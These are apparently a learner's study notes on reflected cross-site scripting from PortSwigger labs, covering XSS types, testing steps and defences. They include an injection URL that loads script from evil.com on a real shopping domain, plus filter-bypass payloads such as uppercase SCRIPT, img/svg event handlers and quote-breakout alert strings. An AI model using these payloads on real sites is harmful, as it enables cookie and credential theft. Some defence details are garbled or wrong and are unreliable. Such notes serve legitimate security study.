# 11.B Cross Site Scripting with PortSwigger NEW

A vulnerable web application allows an attacker to send malicious code to the victim, which can result in cookie theft, password theft, and sensitive data exposure.

The attacker tricks the web application into returning malicious code to the victim’s browser.

## JavaScript

JavaScript is the front-end language that handles action parts.

## How does it work

A vulnerable web application is tricked by the attacker into returning malicious code to the user, then the user executes that malicious code, which can result in cookie theft, sensitive data theft, or compromise of the system.

## Types of XSS

* **Reflected XSS:** when the malicious code request comes from the current HTTP request.
* **Stored XSS:** when the malicious code request comes from the database.
* **DOM Based XSS:** when the vulnerability is in client-side code.

## Reflected XSS

Allows executing malicious code into a web application input parameter, such as a search bar, and the web application executes the malicious code, which responds with activity in the browser.

### What is reflected XSS

* When the application has an input parameter where the user request and get response input reflected.
  * Like: [https://amazon.in/shopping/laptop=?hp](https://amazon.in/shopping/laptop=?hp)
* Where the `hp` is reflected in the response.
* Assuming the web application is vulnerable, then the attacker tricks the web application or adds malicious code.
  * Like: [https://amazon.in/shopping/laptop=?hphttps://evil.com/badcode.js\</scirpt](https://amazon.in/shopping/laptop=?hp%3cscirpt%3ehttps://evil.com/badcode.js%3c/scirpt)>)

### Impact of Reflected XSS

* Break the CIA
* Sensitive data stolen (PII, Password)

This leads the user to get the cookie or sensitive data stolen.

The malicious code is not stored or executed on the server; it is returned to the browser and the browser executes the malicious code.

The browser should validate and sanitize the inputted data.

Reflected XSS is cooler because it targets the random user and exploits the trust of the web application.

### Blackbox Reflected XSS

* Check for reflected response from the web application.
  * If it is reflected, then check for the code any defence coding.
  * Use `ctrl + f` and check the reflected area.
* If it is in the HTML tags, try to break from them using the existing tags and syntax like `>` , “, ‘ `</>` etc.
* Execute some JavaScript function like `alert`, `print` (it triggers the printing function for user), mostly `alert` is blocked from browser end.
* The script word is being replaced with space as input sanitization, which can be bypassed by using the big letter `SCRIPT`.
* The closing tags and double quote, which help in closing HTML tags, can be replaced with space, which can be bypassed by using `<img src>` and `<svg>` tags with JavaScript functions like `onclick`, `onerror`, `onload`.
* Angle Brackets HTML encoding break the code to view the quote, which is double or single, and then use `-` (hyfean) with JavaScript function `[Hexruinx'-alert(1)-']`.
* Angle Brackets HTML Double encoding break the code to view the quote, which is double or single. User input is being outputed in single quote, and the backslash is being outputed in double backslash. Using that to reflect JS `\'-alert()//`.

### Defences against Reflected XSS

* User validation and input sanitization is applied.
* CSP and other defence mechanism should be applied.
* Create a function which sanitized the code.
* Remove the `<script>` tags OR replace the `<script>` tags with URL ENCODING SPACE `%020`.
* Remove the opening, closing and brackets backslash OR replace the opening closing bracket `<>` and backslash with URL ENCODING SPACE `0%20`.
* AngularJS, innerhtml
